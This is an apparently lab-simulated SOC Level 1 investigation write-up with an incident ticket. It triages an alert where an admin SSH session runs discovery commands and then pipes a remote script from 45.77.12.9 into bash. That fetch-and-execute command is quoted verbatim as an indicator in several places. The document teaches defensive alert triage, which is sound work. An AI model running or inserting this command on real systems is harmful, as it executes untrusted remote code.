@@ -1,0 +1,109 @@
+# Suspicious Linux Shell Activity (Lab-Simulated for L1)
+
+Scenario2
+### Alert Shows:
+	sshd > bash > whoami/id/uname/ls > curl http://45.77.12.9/s.sh | bash
+
+### Context Provided:
+User: ADMIN
+Time: 03:14 AM 
+External IP: Company VPN IP 
+Server: Web Server (nginx)
+
+----
+
+## INVESTIGATION PROCESS
+
+### STEP 1 : Validate Alert
+
+    Check:
+		- Is the log source reliable?
+			: Confirm process chain in SIEM tools
+		- Is the hostname correct?
+			: ADMIN
+		- Are timestamps valid?
+			Time		Event
+			03:14:01	SSH Log in
+			03:14:05	bash started
+			03:14:06	whoami
+			03:14:07	id
+			03:14:08	uname
+			03:14:09	ls
+			03:14:12	curl
+		- Is this False Positive?
+	STEP 2 : UNDERSTAND PARENT-CHILD CHAIN
+		Reconstruct:
+		sshd (Remote Login via Company VPN ID)
+		---> bash
+			---> whoami
+			---> id
+			---> uname -a
+			---> ls
+			---> curl | bash
+		INTERPRETATION:
+		sshd -> remote access confirmed
+		bash -> interactive shell
+		whoami/id/uname/ls -> discovery phase
+		curl | bash -> payload execution
+		* this is structured attacker behavior
+	STEP 3 : CHECK ACCOUNT CONTEXT
+		User: ADMIN
+	STEP 4 : CHECK SOURCE IP
+		IP : COMPANY VPN
+		Is this internal?
+		Is it known admin IP?
+		Is it foreign?
+		Is it blacklisted?
+	STEP 5 : TIMELINE RECONSTRUCTION
+		Time		Event
+			03:14:01	SSH Log in
+			03:14:05	bash started
+			03:14:06	whoami
+			03:14:07	id
+			03:14:08	uname
+			03:14:09	ls
+			03:14:12	curl
+
+
+L1 CONCLUSION
+SSH login from company VPN under admin account appears legitimate
+However, execution of remote script via:
+ curl http://45.77.12.9/s.sh | bash
+is not standard maintenance behavior and presents potential risk
+
+
+-----
+
+INCIDENT TICKET - SOC L1
+	CASE ID: INC-2026-0212-001
+	ALERT NAME: SUSPICIOUS LINUX SHELL ACTIVITY
+	SEVERITY: MEDIUM
+	DATE/TIME: 2026-02-02, 03:14 UTC
+  HOST: WEB SERVER (nginx)
+
+SUMMARY :
+	Detected SSH login under user: ADMIN from company VPN IP, followed by system discovery commands and execution of remote script via: curl http://45.77.12.9/s.sh | bash 
+
+INVESTIGATION FINDINGS:
+	- Parent-child process chain confirmed: sshd -> bash -> whoami/id/uname/ls -> curl | bash
+  - SSH login originated from company VPN IP
+	- Execution of remote script from IP 45.77.12.9
+	- Activity occurred outside business hours (03:14 AM)
+  - No corresponding change ticket identified at time of investigation.
+
+INDICATORS OF COMPROMISE (IOC/s):
+	- Suspicious command: curl http://45.77.12.9/s.sh | bash
+
+ASSESSMENT:
+	Further validation required:
+ 	- Confirm with admin if this action was intentional
+	- Validate IP reputation
+	- Check change management logs
+Escalation recommended for confirmation.
+
+Confidence Level: Medium
+
+RECOMMENDED ACTIONS:
+	Escalate to SOC L2 for validation
+	Host isolation recommended if activity cannot be verified as authorized.
+
